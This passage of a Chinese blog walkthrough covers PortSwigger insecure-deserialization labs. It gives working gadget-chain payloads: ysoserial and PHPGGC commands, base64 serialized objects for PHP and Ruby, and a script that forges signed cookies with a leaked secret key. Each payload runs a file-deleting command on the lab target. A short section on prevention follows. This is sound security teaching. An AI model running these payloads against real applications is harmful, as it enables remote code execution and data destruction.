+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:14:&quot;CustomTemplate&quot;:1:&#123;s:14:&quot;lock_file_path&quot;;s:23:&quot;&#x2F;home&#x2F;carlos&#x2F;morale.txt&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    base64编码修改cookie重新发包，成功删除指定文件。</p>
+<h4 id="6-6-Gadget链"><a href="#6-6-Gadget链" class="headerlink" title="6.6 Gadget链"></a>6.6 Gadget链</h4><p>​    “Gadget”是应用程序中存在的代码片段，可以帮助攻击者实现特定目标。单个Gadget可能不会直接对用户输入造成任何有害影响。但是，攻击者的目标可能只是调用一种方法，该方法会将其输入传递给另一个Gadget。通过以这种方式将多个Gadget链接在一起，攻击者可以潜在地将其输入传递到危险的“接收器Gadget”中，从而在其中造成最大的破坏。</p>
+<p>​    重要的是要了解，与某些其他类型的利用不同，Gadget链不是攻击者构建的链接方法的有效负载。网站上已经存在所有代码。攻击者唯一控制的是传递到Gadget链中的数据。通常使用反序列化期间调用的魔术方法（有时称为“启动Gadget”）完成此操作。</p>
+<h5 id="6-6-1-使用Apache-Commons开发Java反序列化"><a href="#6-6-1-使用Apache-Commons开发Java反序列化" class="headerlink" title="6.6.1 使用Apache Commons开发Java反序列化"></a>6.6.1 使用Apache Commons开发Java反序列化</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons</a></p>
+<p>​    登录到您自己的帐户，观察会话cookie包含序列化的Java对象。向Burp Repeater发送包含会话cookie的请求。</p>
+<p>​    下载“ ysoserial”工具并执行以下命令：<br><code>java -jar path/to/ysoserial.jar CommonsCollections4 &#39;rm /home/carlos/morale.txt&#39; | base64</code><br>​    这将生成一个包含有效负载的序列化对象，将会话cookie替换为刚创建的恶意cookie，并对整个字符串进行URL编码：</p>
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200720175610222.png" alt="image-20200720175610222"></p>
+<h5 id="6-6-2-通过预建的Gadget链利用PHP反序列化"><a href="#6-6-2-通过预建的Gadget链利用PHP反序列化" class="headerlink" title="6.6.2 通过预建的Gadget链利用PHP反序列化"></a>6.6.2 通过预建的Gadget链利用PHP反序列化</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain</a></p>
+<p>​    登录并观察cookie中的序列化数据，进行uel解码，包含使用SHA-1 HMAC哈希签名的会话令牌。Base64对令牌进行解码以发现它包含序列化的PHP对象。如果修改Cookie，则会引发异常，因为此数字签名不再匹配。还要注意内部服务器错误，该错误表明网站正在使用Symfony 4.3.6。</p>
+<p>​    找到<code>/cgi-bin/phpinfo.php</code>文件中，存在泄露网站的<code>SECRET_KEY</code>：</p>
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200721145619238.png" alt="image-20200721145619238"></p>
+<p>​    下载“ PHPGGC”工具并执行以下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;phpggc Symfony&#x2F;RCE4 exec &#39;rm &#x2F;home&#x2F;carlos&#x2F;morale.txt&#39; | base64</span><br></pre></td></tr></table></figure>
+
+<p>​    这将生成一个包含有效负载的序列化对象：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>​    创建一个包含恶意对象的有效的经过签名的cookie。您可以使用以下PHP脚本执行此操作。该<code>$object</code>是Base64编码刚刚生成的对象，<code>$secretKey</code>是从获得的<code>phpinfo.php</code>文件中的<code>SECRET_KEY</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $payload &#x3D; urlencode(&#39;&#123;&quot;token&quot;:&quot;&#39; . $object . &#39;&quot;,&quot;sig_hmac_sha1&quot;:&quot;&#39; . hash_hmac(&#39;sha1&#39;, $object, $secretKey) . &#39;&quot;&#125;&#39;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200721145935109.png" alt="image-20200721145935109"></p>
+<p>​    修改cookie为生成的恶意cookie，重新发包，成功删除指定文件：</p>
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200721150254347.png" alt="image-20200721150254347"></p>
+<h5 id="6-6-3-使用已记录的Gadget链开发Ruby反序列化"><a href="#6-6-3-使用已记录的Gadget链开发Ruby反序列化" class="headerlink" title="6.6.3 使用已记录的Gadget链开发Ruby反序列化"></a>6.6.3 使用已记录的Gadget链开发Ruby反序列化</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain</a></p>
+<p>​    登录账户，抓包base64解码查看cookie包含序列化的Ruby对象，查找Luke Jahnke撰写的“ Ruby 2.x Universal RCE Gadget Chain”。复制用于生成有效负载的脚本，然后将应执行的命令从<code>id</code>更改为<code>rm /home/carlos/morale.txt</code>并运行脚本。这将生成一个包含有效负载的序列化对象。输出包含对象的十六进制和Base64编码版本。复制Base64编码的对象：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BAhVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0BzoLQHNwZWNzWwdvOh5HZW06OlNvdXJjZTo6U3BlY2lmaWNGaWxlBjoKQHNwZWNvOhtHZW06OlN0dWJTcGVjaWZpY2F0aW9uCDoRQGxvYWRlZF9mcm9tSSIlfHJtIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0IDE+JjIGOgZFVDoKQGRhdGEwOwkwbzsIADoRQGRldmVsb3BtZW50Rg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>​    同样需要url编码，修改cookie重新发包：</p>
+<p><img src="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200721152950252.png" alt="image-20200721152950252"></p>
+<h2 id="7-如何防止不安全的反序列化漏洞"><a href="#7-如何防止不安全的反序列化漏洞" class="headerlink" title="7. 如何防止不安全的反序列化漏洞"></a>7. 如何防止不安全的反序列化漏洞</h2><p>​    一般而言，除非绝对必要，否则应避免对用户输入进行反序列化。在许多情况下，它可能带来的利用的高度严重性以及防范这些利用的难度超过了收益。</p>
+<p>​    如果确实需要对来自不受信任来源的数据进行反序列化，请采用可靠的措施以确保数据未被篡改。例如，您可以实施数字签名来检查数据的完整性。但是，请记住，<strong>在</strong>开始反序列化过程<strong>之前，</strong>必须进行任何检查。否则，它们几乎没有用。</p>
+<p>​    如果可能，应避免完全使用通用的反序列化功能。这些方法的序列化数据包含原始对象的所有属性，包括可能包含敏感信息的私有字段。相反，您可以创建自己的特定于类的序列化方法，以便至少可以控制公开哪些字段。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    joker0xxx3
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="不安全的序列化">http://joker-vip.github.io/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+          
+            <a href="/tags/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"><i class="fa fa-tag"></i> 不安全的序列化</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/16/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" rel="next" title="HTTP请求走私">
+                <i class="fa fa-chevron-left"></i> HTTP请求走私
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/header.jpg"
+                alt="joker0xxx3" />
+            
+              <p class="site-author-name" itemprop="name">joker0xxx3</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+                <a href="/archives">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/joker-vip" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1186948300@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.cnblogs.com/joker-vip/" target="_blank" title="博客园">
+                      
+                        <i class="fa fa-fw fa-refresh"></i>博客园</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+                
+                  <span class="links-of-blogroll-item">
+                    <a href="https://scholar10.github.io/" title="Sch0lar" target="_blank">Sch0lar</a>
+                  </span>
+                
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-什么是序列化？"><span class="nav-text">1. 什么是序列化？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-序列化与反序列化"><span class="nav-text">2.序列化与反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-什么是不安全的反序列化？"><span class="nav-text">3. 什么是不安全的反序列化？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-不安全的反序列化漏洞如何产生？"><span class="nav-text">4. 不安全的反序列化漏洞如何产生？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-不安全的反序列化有何影响？"><span class="nav-text">5. 不安全的反序列化有何影响？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-利用不安全的反序列化漏洞"><span class="nav-text">6. 利用不安全的反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#6-1-识别序列化"><span class="nav-text">6.1 识别序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#6-1-1-PHP序列化格式"><span class="nav-text">6.1.1 PHP序列化格式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-1-2-Java序列化格式"><span class="nav-text">6.1.2 Java序列化格式</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-2-操作序列化对象"><span class="nav-text">6.2 操作序列化对象</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#6-2-1-修改对象属性"><span class="nav-text">6.2.1 修改对象属性</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-2-2-修改数据类型"><span class="nav-text">6.2.2 修改数据类型</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-3-使用应用程序功能"><span class="nav-text">6.3 使用应用程序功能</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-4-魔术方法"><span class="nav-text">6.4 魔术方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-5-注入任意对象"><span class="nav-text">6.5 注入任意对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-6-Gadget链"><span class="nav-text">6.6 Gadget链</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#6-6-1-使用Apache-Commons开发Java反序列化"><span class="nav-text">6.6.1 使用Apache Commons开发Java反序列化</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-6-2-通过预建的Gadget链利用PHP反序列化"><span class="nav-text">6.6.2 通过预建的Gadget链利用PHP反序列化</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-6-3-使用已记录的Gadget链开发Ruby反序列化"><span class="nav-text">6.6.3 使用已记录的Gadget链开发Ruby反序列化</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-如何防止不安全的反序列化漏洞"><span class="nav-text">7. 如何防止不安全的反序列化漏洞</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">joker0xxx3</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
